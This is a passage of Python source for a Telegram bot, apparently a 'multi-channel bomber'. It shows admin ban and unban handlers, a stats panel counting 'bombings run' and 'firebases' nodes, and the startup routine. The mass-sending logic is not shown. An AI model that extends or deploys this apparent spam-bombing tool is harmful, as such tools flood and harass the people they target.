        await cq.answer(sc("🗑 ᴀᴅᴍɪɴ ʀᴇᴍᴏᴠᴇᴅ!"), show_alert=True)
        await cb_admins(cq)

# ── Ban/Unban ───────────────────────────────────────────────────
@R.callback_query(F.data == "admin:ban")
async def cb_ban(cq: types.CallbackQuery, state: FSMContext):
    await state.set_state(Form.schedule_name)
    try:
        await cq.message.edit_text(sc("🚫 ʙᴀɴ ᴜꜱᴇʀ\n\nꜱᴇɴᴅ ᴛʜᴇ ᴜꜱᴇʀ ɪᴅ ᴛᴏ ʙᴀɴ:\n\n<i>ᴜꜱᴇ /cancel ᴛᴏ ᴀʙᴏʀᴛ</i>"), parse_mode="HTML",
            reply_markup=kb([[("❌ " + sc("ᴄᴀɴᴄᴇʟ"), "admin:panel", "danger")]]))
    except Exception:
        pass

@R.message(Form.schedule_name)
async def process_ban(msg: types.Message, state: FSMContext):
    try:
        uid = int(msg.text.strip())
        d = load()
        if uid not in d.get("banned", []):
            d["banned"].append(uid)
            save(d)
            try:
                await state.clear()
            except Exception:
                pass
            await msg.answer(f"{sc('🚫 ᴜꜱᴇʀ ʙᴀɴɴᴇᴅ!')}\n\n👤 <code>{uid}</code>",
                parse_mode="HTML", reply_markup=admin_panel_kb(d))
        else:
            await msg.answer(sc("❌ ᴛʜɪꜱ ᴜꜱᴇʀ ɪꜱ ᴀʟʀᴇᴀᴅʏ ʙᴀɴɴᴇᴅ!"))
    except Exception:
        await msg.answer(sc("❌ ɪɴᴠᴀʟɪᴅ ᴜꜱᴇʀ ɪᴅ!"))

@R.callback_query(F.data == "admin:unban")
async def cb_unban(cq: types.CallbackQuery):
    d = load()
    banned = d.get("banned", [])
    if not banned:
        await cq.answer(sc("✅ ɴᴏ ʙᴀɴɴᴇᴅ ᴜꜱᴇʀꜱ!"), show_alert=True)
        return
    rows = [[(f"🔓 {sc('ᴜɴʙᴀɴ')} {uid}", f"admin:unban_do:{uid}", "success") for uid in banned]]
    rows.append([("◀️ " + sc("ʙᴀᴄᴋ"), "admin:panel", "primary")])
    try:
        await cq.message.edit_text(sc("✅ ᴜɴʙᴀɴ ᴜꜱᴇʀ\n\nᴛᴀᴘ ᴛᴏ ᴜɴʙᴀɴ:"),
            reply_markup=kb(rows), parse_mode="HTML")
    except Exception:
        pass

@R.callback_query(F.data.startswith("admin:unban_do:"))
async def cb_unban_do(cq: types.CallbackQuery):
    try:
        uid = int(cq.data.split(":")[2])
    except Exception:
        await cq.answer(sc("❌ ɪɴᴠᴀʟɪᴅ ɪᴅ"), show_alert=True)
        return
    d = load()
    if uid in d.get("banned", []):
        d["banned"].remove(uid)
        save(d)
        await cq.answer(f"✅ {uid} {sc('ᴜɴʙᴀɴɴᴇᴅ!')}", show_alert=True)
        await cb_unban(cq)

# ── Global Stats ────────────────────────────────────────────────
@R.callback_query(F.data == "admin:stats")
async def cb_admin_stats(cq: types.CallbackQuery):
    d = load()
    stats = d.get("stats", {"total_sent": 0, "total_failed": 0, "total_bombings": 0})
    total = stats.get("total_sent", 0) + stats.get("total_failed", 0)
    rate = round(stats.get("total_sent", 0) / total * 100, 1) if total > 0 else 0
    text = styled_box("ɢʟᴏʙᴀʟ ᴛᴇʟᴇᴍᴇᴛʀʏ",
        f"🔘 {sc('ɴᴏᴅᴇꜱ')}: <b>{len(d.get('firebases', []))}</b>\n"
        f"📅 {sc('ꜱᴄʜᴇᴅᴜʟᴇꜱ')}: <b>{len(d.get('schedules', []))}</b>\n"
        f"👥 {sc('ᴀᴅᴍɪɴꜱ')}: <b>{len(d.get('admins', []))}</b>\n"
        f"🚫 {sc('ʙᴀɴɴᴇᴅ')}: <b>{len(d.get('banned', []))}</b>\n\n"
        f"✅ {sc('ᴛᴏᴛᴀʟ ꜱᴇɴᴛ')}: <b>{stats.get('total_sent', 0)}</b>\n"
        f"❌ {sc('ᴛᴏᴛᴀʟ ꜰᴀɪʟᴇᴅ')}: <b>{stats.get('total_failed', 0)}</b>\n"
        f"💣 {sc('ʙᴏᴍʙɪɴɢꜱ ʀᴜɴ')}: <b>{stats.get('total_bombings', 0)}</b>\n"
        f"📈 {sc('ꜱᴜᴄᴄᴇꜱꜱ ʀᴀᴛᴇ')}: <b>{rate}%</b>")
    try:
        await cq.message.edit_text(text, reply_markup=back_button("admin:panel"), parse_mode="HTML")
    except Exception:
        pass

# ── Catch-all for /cancel ───────────────────────────────────────
@R.message(Command("cancel"))
async def cmd_cancel(msg: types.Message, state: FSMContext):
    try:
        await state.clear()
    except Exception:
        pass
    await msg.answer(sc("✅ ᴄᴀɴᴄᴇʟʟᴇᴅ!"), reply_markup=main_menu(msg.from_user.id, load()))

# ══════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════
async def main():
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    try:
        me = await bot.get_me()
        log.info(f"✅ @{me.username} started ({VERSION})")
    except Exception as e:
        log.error(f"Failed to fetch bot info: {e}")
        return

    await start_scheduler(bot)
    try:
        await bot.send_message(OWNER_ID, f"🚀 {sc('ᴍᴜʟᴛɪ-ᴄʜᴀɴɴᴇʟ ʙᴏᴍʙᴇʀ')} {VERSION} {sc('ᴏɴʟɪɴᴇ')}\n@{me.username}\n\n📅 {sc('ꜱᴄʜᴇᴅᴜʟᴇʀ')}: ✅ {sc('ʀᴜɴɴɪɴɢ')}")
    except Exception:
        pass
    try:
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    finally:
        await stop_scheduler()

if __name__ == "__main__":
    asyncio.run(main())